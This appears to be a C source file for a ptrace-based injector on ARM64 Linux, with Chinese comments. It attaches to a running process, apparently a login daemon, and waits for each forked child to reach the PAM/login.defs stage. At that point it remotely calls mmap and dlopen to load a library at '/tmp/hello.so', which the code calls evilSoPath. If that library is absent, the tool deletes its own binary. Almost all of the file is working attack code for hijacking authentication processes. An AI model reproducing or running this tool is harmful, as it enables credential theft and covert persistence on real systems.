#include <stdlib.h>
#include <pthread.h>
#include <stdio.h>
#include <signal.h> 
#include <unistd.h>
#include <asm/ptrace.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
//#include <sys/reg.h>
#include <link.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <signal.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/uio.h>
#define pt_regs user_pt_regs
#define uregs	regs
#define ARM_pc	pc
#define ARM_sp	sp
#define ARM_cpsr	pstate
#define ARM_lr		regs[30]
#define ARM_r0		regs[0]
#define ARM_r1		regs[1]
#ifndef PTRACE_GETREGS
#define PTRACE_GETREGS PTRACE_GETREGSET
#endif
#ifndef PTRACE_SETREGS
#define PTRACE_SETREGS PTRACE_SETREGSET
#endif
#define CPSR_T_MASK (1u<<5)
char evilSoPath[] = "/tmp/hello.so";
char libcRegEx[] = "libc-";
struct gcStack {
    struct gcStack * up;
    pid_t * target_pid;
} * gcs;

int ptrace_read(int pid, unsigned long addr, void *data, unsigned int len)
{
    int bytesRead = 0;
    int i = 0;
    long word = 0;
    unsigned long *ptr = (unsigned long *)data;

    while (bytesRead < len)
    {
    word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytesRead, NULL);
    if (word == -1)
    {
        fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
        return 1;
    }
    bytesRead += sizeof(long);
    if (bytesRead > len)
    {
        memcpy(ptr + i, &word, sizeof(long) - (bytesRead - len));
        break;
    }
    ptr[i++] = word;
    }

    return 0;
}


int ptrace_readdata( pid_t pid,  uint8_t *src, uint8_t *buf, size_t size )
{
    uint32_t i, j, remain;
    uint8_t *laddr;

    union u {
        long val;
        char chars[sizeof(long)];
    } d;

    j = size / 4;
    remain = size % 4;

    laddr = buf;

    for ( i = 0; i < j; i ++ )
    {
         d.val = ptrace( PTRACE_PEEKTEXT, pid, src, 0 );
         memcpy( laddr, d.chars, 4 );
         src += 4;
         laddr += 4;
    }

    if ( remain > 0 )
    {
        d.val = ptrace( PTRACE_PEEKTEXT, pid, src, 0 );
        memcpy( laddr, d.chars, remain );
    }

    return 0;

}

int ptrace_writedata( pid_t pid, uint8_t *dest, uint8_t *data, size_t size )
{
    uint32_t i, j, remain;
    uint8_t *laddr;

    union u {
        long val;
        char chars[sizeof(long)];
    } d;

    j = size / 4;
    remain = size % 4;
    
    laddr = data;
    
    for ( i = 0; i < j; i ++ )
    {
        memcpy( d.chars, laddr, 4 );
        ptrace( PTRACE_POKETEXT, pid, dest, d.val );
    
        dest  += 4;
        laddr += 4;
    }

    if ( remain > 0 )
    {
        d.val = ptrace( PTRACE_PEEKTEXT, pid, dest, 0 );
        for ( i = 0; i < remain; i ++ )
        {
            d.chars[i] = *laddr ++;
        }

        ptrace( PTRACE_POKETEXT, pid, dest, d.val );
        
    }

    return 0;
}


int ptrace_writestring( pid_t pid, uint8_t *dest, char *str  )
{
    return ptrace_writedata( pid, dest, str, strlen(str)+1 );
}

int ptrace_call( pid_t pid, uint64_t addr, long *params, uint32_t num_params, struct pt_regs * regs ,int is_trap)
{
    // 多于8个参数通过栈传递

    if( num_params >8){

        regs->ARM_sp-=(num_params-8)*sizeof(long);
        
        ptrace_writedata(pid,(void*)regs->ARM_sp,(char*)&params[6],sizeof(long)*(num_params-6));
    }
    // 前6个参数通过寄存器传递
    for(size_t i=0;i<8;i++){
        regs->uregs[i]=params[i];
    }
    // 调用函数
    regs->ARM_pc=(unsigned long long)addr;
    // 判断arm模式还是thumb模式
    if(regs->ARM_pc&1){
        regs->ARM_pc&=~1;
        regs->ARM_cpsr|=CPSR_T_MASK;
    }else{
        regs->ARM_cpsr&=~CPSR_T_MASK;
    }
    regs->ARM_lr=0;
    
    ptrace_setregs(pid,regs);
    int stat=0;
    while(stat!=0xb7f){
        ptrace_continue(pid);
        waitpid(pid,&stat,WUNTRACED);
        //printf("+ [Call] substatus: %x\n",stat);
    }

    //ptraceGetRegs(pid,regs);
    ptrace_getregs(pid,regs);
    return 0;
}



int ptrace_getregs( pid_t pid, struct pt_regs * regs )
{
    struct iovec io;
    io.iov_base=regs;
    io.iov_len=sizeof(struct pt_regs);
    if ( ptrace( PTRACE_GETREGS, pid, NT_PRSTATUS, &io ) < 0 )
    {
        printf( "- [Getregs][%d] Can not get register values\n",pid );
        //exit(0);
        return -1;
    }

    return 0;
}

int ptrace_setregs( pid_t pid, struct pt_regs * regs )
{
    struct iovec io;
    io.iov_base=regs;
    io.iov_len=sizeof(struct pt_regs);
    if ( ptrace( PTRACE_SETREGS, pid, NT_PRSTATUS, &io ) < 0 )
    {
        printf( "- [Setregs][%d] Can not set register values\n",pid );
        return -1;
    }

    return 0;
}




int ptrace_continue( pid_t pid )
{
    if ( ptrace( PTRACE_CONT, pid, NULL, 0 ) < 0 )
        {
            perror( "ptrace_cont" );
            return -1;
        }

        return 0;
}

int ptrace_attach( pid_t pid )
{
    if(ptrace(PTRACE_ATTACH,pid,NULL,NULL)==-1){
        printf(" - [Attach] Failed to attach:%d\n",pid);
        return;
    }
    int stat=0;
    waitpid(pid,&stat,WUNTRACED);

    //DEBUG_PRINT("attached\n");

    if ( ptrace( PTRACE_SYSCALL, pid, NULL, 0  ) < 0 )
    {
        perror( "ptrace_syscall" );
        return -1;
    }



    waitpid( pid, NULL, WUNTRACED );

    return 0;
}

int ptrace_detach( pid_t pid )
{
    if ( ptrace( PTRACE_DETACH, pid, NULL, 0 ) < 0 )
        {
            perror( "ptrace_detach" );
            return -1;
        }

        return 0;
}

void get_libc_path( pid_t pid, char* path )
{
    FILE *fp;
    long addr = 0;
    char *pch;
    char filename[32];
    char line[1024];

    if ( pid < 0 )
    {
        /* self process */
        snprintf( filename, sizeof(filename), "/proc/self/maps", pid );
    }
    else
    {
        snprintf( filename, sizeof(filename), "/proc/%d/maps", pid );
    }

    fp = fopen( filename, "r" );

    if ( fp != NULL )
    {
        while ( fgets( line, sizeof(line), fp ) )
        {
            if ( strstr( line, libcRegEx ) )
            {
               
                 char *m = strrchr(line,' ');
                char *tmp=strchr(m,'\n');
                *tmp='\0';
                m = m+1;
                strcpy(path,m);
                break;
            }
        }

                fclose( fp ) ;
    }

    return;
}
void* get_module_base( pid_t pid, const char* module_name )
{
    FILE *fp;
    long addr = 0;
    char *pch;
    char filename[32];
    char line[1024];

    if ( pid < 0 )
    {
        /* self process */
        snprintf( filename, sizeof(filename), "/proc/self/maps", pid );
    }
    else
    {
        snprintf( filename, sizeof(filename), "/proc/%d/maps", pid );
    }

    fp = fopen( filename, "r" );

    if ( fp != NULL )
    {
        while ( fgets( line, sizeof(line), fp ) )
        {
            if ( strstr( line, module_name ) )
            {
                pch = strtok( line, "-" );
                addr = strtoul( pch, NULL, 16 );

                if ( addr == 0x8000 )
                    addr = 0;

                break;
            }
        }

                fclose( fp ) ;
    }

    return (void *)addr;
}
void* get_remote_addr( pid_t target_pid, const char* module_name, void* local_addr )
{
    void* local_handle, *remote_handle;

    local_handle = get_module_base( -1, module_name );
    remote_handle = get_module_base( target_pid, module_name );

    //printf( "+ get_remote_addr: local[%x], remote[%x]\n", local_handle, remote_handle );

    return (void *)(local_addr-local_handle+remote_handle  );
}



//=====================utils end=====================

void ManualGC(pid_t target_pid){
    struct pt_regs regs,original_regs;
    char libc_path[255];
    void * handle = dlopen(libc_path,RTLD_LAZY);
    get_libc_path(target_pid,libc_path);
    void * self_waitpid_addr = dlsym(handle,"waitpid");
    printf("+ [ManualGC][%d] Self Waitpid address:%p\n",target_pid,self_waitpid_addr);
    void* libc_moudle_base = get_module_base(-1,libcRegEx);
    void* waitpid_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_waitpid_addr );
    printf("+ [ManualGC][%d] Remote Waitpid address:%p\n",target_pid,waitpid_addr);
    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("- [ManualGC][%d] Getregs Error,target: %d\n",target_pid,target_pid );
        return ;
    }
    memcpy(&original_regs,&regs,sizeof(struct pt_regs));
    while(1){
        long parameters[3];
        parameters[0] = -1;      
        parameters[1] = NULL; 
        parameters[2] = WNOHANG ; 
        if(ptrace_call( target_pid, (uint64_t)waitpid_addr, parameters, 3,&regs,0 )==-1){
                printf("- [ManualGC][%d] Writedata Error\n",target_pid );
                return ;
        }
        ptrace_getregs( target_pid, &regs ); // 获得调用结果
        int retval = regs.ARM_r0;
        printf("+ [ManualGC][%d] waitpid = %ld \n",target_pid,retval );
        if(retval == -1||retval == 0||retval == 4294967295){ // 4294967295 == -1
            break;
        }
    }
    

    ptrace_setregs( target_pid, &original_regs );
    ptrace_continue( target_pid );


}

int Inject_Shellcode(pid_t target_pid){
        struct pt_regs regs, original_regs;
        void *malloc_addr, *dlopen_mode_addr,*mmap_addr;
        uint8_t *remote_code_ptr,*local_code_ptr;
        uint32_t code_length;
        char libc_path[255];
        FILE *fp;
        
        
        fp = fopen(evilSoPath,"r");
        if(fp == NULL){
            printf("! [Inject][%d] Cannot find so file, Exit and remove",target_pid);
            char buf[ 1024 ];
	        int count;
	        count = readlink( "/proc/self/exe", buf, 1024 );
	        if ( count < 0 || count >= 1024 )
	        { 
                exit(0);
	        }
	        buf[ count ] = '\0';
	        char cmd[1024];
            snprintf(cmd,2048,"rm %s",buf);
            system(cmd);
            exit(0);
        }else{
            fclose(fp);
        }
        if ( ptrace_attach( target_pid ) == -1 ){

                printf("- [Inject][%d] inject attach failed\n",target_pid );
                return -1;
        }
        printf ("+ [Inject][%d] Waiting for process...\n",target_pid);
        printf ("+ [Inject][%d] Getting Registers\n",target_pid);
        if ( ptrace_getregs( target_pid, &regs ) == -1 ){
                printf("- Getregs Error\n" );
                return -1;
        }
        memcpy(&original_regs,&regs,sizeof(struct pt_regs));
        printf ("+ [Inject][%d] Injecting shell code at %p\n", target_pid,(void*)regs.ARM_pc);
        

        
        void* libc_moudle_base = NULL;
        libc_moudle_base = get_module_base(-1,libcRegEx);
        get_libc_path(target_pid,libc_path);
        if(libc_moudle_base==NULL){
            printf("- [Inject][%d] Can't find libc-xxxx,try to find libc.so.x\n",target_pid);
            char tmp_libc[] = "libc.so";
            strcpy(libcRegEx,tmp_libc);
            libc_moudle_base = get_module_base(-1,libcRegEx);
            get_libc_path(target_pid,libc_path);
        }

        void * handle = dlopen(libc_path,RTLD_LAZY);
        void * self_dlopen_mode_addr = dlsym(handle,"dlopen");
        if(self_dlopen_mode_addr==NULL){
            printf("- [Inject][%d] Can't find dlopen in libc,try to use __libc_dlopen_mode\n",target_pid);
            self_dlopen_mode_addr = dlsym(handle,"__libc_dlopen_mode");
        }
        void * self_malloc_addr = dlsym(handle,"malloc");
        void * self_mmap_addr = dlsym(handle,"mmap");
        malloc_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_malloc_addr );
        mmap_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_mmap_addr );
        dlopen_mode_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_dlopen_mode_addr );
        
        printf("+ [Inject][%d] self libc moudle base:%p\n",target_pid,libc_moudle_base);
        printf("+ [Inject][%d] remote libc path:%s\n",target_pid,libc_path);
        printf("+ [Inject][%d] self libc_dlopen_mode base:%p\n",target_pid,self_dlopen_mode_addr);
        printf("+ [Inject][%d] remote malloc addr:%p\n",target_pid,malloc_addr);
        printf("+ [Inject][%d] remote mmap addr:%p local:%p\n",target_pid,mmap_addr,self_mmap_addr);
        printf("+ [Inject][%d] remote libc_dlopen_mode addr:%p\n",target_pid,dlopen_mode_addr);




        long parameters[10];
        parameters[0] = 0;      // addr
        parameters[1] = 0x4000; // size
        parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
        parameters[3] =  MAP_ANONYMOUS | MAP_PRIVATE; // flags
        parameters[4] = 0; //fd
        parameters[5] = 0; //offset

        if(ptrace_call( target_pid, (uint64_t)mmap_addr, parameters, 6,&regs,0 )==-1){
                printf("- [Inject][%d]Writedata Error\n",target_pid );
                return -1;
        }
        if ( ptrace_getregs( target_pid, &regs ) == -1 ){
                printf("- [Inject][%d] Getregs Error\n",target_pid );
                return -1;
        }
        printf("+ [Inject][%d] mmap result: %p\n",target_pid,regs.ARM_r0);
        remote_code_ptr = (char *)regs.ARM_r0; //获取mmap取得的地址
        ptrace_writedata(target_pid,remote_code_ptr,evilSoPath,strlen(evilSoPath)+1);
        printf("+ [Inject][%d] Writing EvilSo Path at:%p\n",target_pid,remote_code_ptr);
        

        // arm汇编忘的差不多了，就这样子凑合凑合用吧
        parameters[1] = 0x2;      // addr
        parameters[0] = remote_code_ptr; // size
        if(ptrace_call( target_pid, (uint64_t)dlopen_mode_addr, parameters, 2,&regs,0 )==-1){
                printf("- [ManualGC][%d] Writedata Error\n",target_pid );
                return ;
        }
        remote_code_ptr += strlen(evilSoPath)+1;




        /*
        extern uint64_t _dlopen_mode_param1_s, _dlopen_mode_addr_s,_inject_start_s,_inject_end_s;
        memcpy((void*)((long)&_dlopen_mode_param1_s+2),&remote_code_ptr,sizeof(long));
        memcpy((void*)((long)&_dlopen_mode_addr_s+2),&dlopen_mode_addr,sizeof(long));
        remote_code_ptr += strlen(evilSoPath)+1;
        local_code_ptr = (uint8_t *)&_inject_start_s;
        code_length = (long)&_inject_end_s - (long)&_inject_start_s;
        ptrace_writedata(target_pid,remote_code_ptr,local_code_ptr,code_length ); //写入本地shellcode
        printf("+ [Inject][%d] Writing Shellcode at:%p code length:%d\n",target_pid,remote_code_ptr,code_length);
        
        
        
        regs.ARM_pc = (long)remote_code_ptr+6;
        ptrace_setregs( target_pid, &regs );
        ptrace_continue( target_pid );

        waitpid( target_pid, NULL, WUNTRACED  );
        */
        printf("+ [Inject][%d] EvilSo Injected.Recorver the regsing...\n",target_pid);
        ptrace_setregs( target_pid, &original_regs );
        
        ptrace_continue( target_pid );
        //ptrace_detach(target_pid);
        

}



int WaitforLibPAM(pid_t target_pid){
    struct pt_regs regs;

    if ( ptrace_attach( target_pid ) == -1 ){

        printf("- [WaitforLibPAM][%d] WaitforLibPAM attach Failed\n",target_pid );
        return -1;
    }
    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("- [WaitforLibPAM][%d] Getregs Error\n",target_pid );
        return -1;
    }
    long num,bit=0,finded = 0;
    char *path = malloc(255);
    char libsystemd[] = "login.defs";
    while(1){
        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
        waitpid( target_pid, NULL, WUNTRACED );
        if (ptrace_getregs( target_pid, &regs ) ==-1){
            return;
        }
        num = regs.regs[8]; ;
        if(regs.regs[7] == 1 && num ==56){ // openat 在arm的调用号为56
            
            ptrace_readdata(target_pid,(void *)regs.ARM_r1,path,255);
            if(strstr(path,libsystemd)){
                printf("+ [WaitforLibPAM][%d] SubProcess:openat find path: %s\n",target_pid,path);
                ptrace_detach(target_pid);
                Inject_Shellcode(target_pid);
                break;
            }
        }
        // arm 没有open调用号
        // if(num ==2){
            
        //     ptrace_readdata(target_pid,(void *)regs.ARM_r1,path,255);
        //     if(strstr(path,libsystemd)){
        //         printf("+ [WaitforLibPAM][%d][openat] SubProcess:open find path: %s\n",target_pid,path);
        //         ptrace_detach(target_pid);
        //         //Inject_Shellcode(target_pid);
        //         break;
        //     }
        // }

    }
    printf("+ [WaitforLibPAM][%d] Wait ChildProcess Ending\n",target_pid);
    waitpid( target_pid,NULL,0 );
    struct gcStack node;
    node.up = gcs;
    node.target_pid = target_pid;
    gcs = &node;

    printf("+ [WaitforLibPAM][%d] GC commit and ChildProcess End Successful\n",target_pid);
}

int main(int argc, char const *argv[])
{
    

    pid_t                   target_pid;
    target_pid = atoi (argv[1]);
    struct pt_regs regs;


    if ( ptrace_attach( target_pid ) == -1 ){

        printf("- [Main][%d] Attach Failed\n",target_pid );
        return -1;
    }
    
    printf ("+ [Main][%d] Waiting for process...\n",target_pid);
    printf ("+ [Main][%d] Getting Registers\n",target_pid);
    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("- [Main][%d] Getregs Error\n" ,target_pid);
        return -1;
    }
    printf ("+ [Main][%d] RAX is %p\n",target_pid, (void*)regs.ARM_r0);
    long num,subprocess;
    // 初始化栈顶
    struct gcStack bottom;
    bottom.up=NULL;
    bottom.target_pid = 0;
    gcs = &bottom;



    printf ("+ [Main][%d] Initialization stack successful\n",target_pid);

    while(1){
        if(gcs->up != NULL){
            // need GC
            printf ("+ [Main][%d] ManualGC Start\n",target_pid);
            ManualGC(target_pid);
            gcs = gcs->up;
            printf ("+ [Main][%d] ManualGC End\n------------------------------------\n",target_pid);
            
        }
        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
        waitpid( target_pid, NULL, WUNTRACED );
        pthread_t id;
        ptrace_getregs( target_pid, &regs ); // 获得调用结果
        //regs[7] 再syscall调用前为0，调用后为1
        num = regs.regs[8];  //arm系统调用结果号保存再regs[8]
        //printf("+ Now Number = %d\n",num);
        if(regs.regs[7]== 1 && num == 220){
            
            printf("+ [Main][%d] Process maybe = %ld \n",target_pid, regs.ARM_r0);
            subprocess = regs.ARM_r0;
            if(subprocess > 0){
                //ManualGC(target_pid);
                pthread_create(&id,NULL,(void *) WaitforLibPAM,subprocess);
            }

        }
        
    }

        return 0;
}
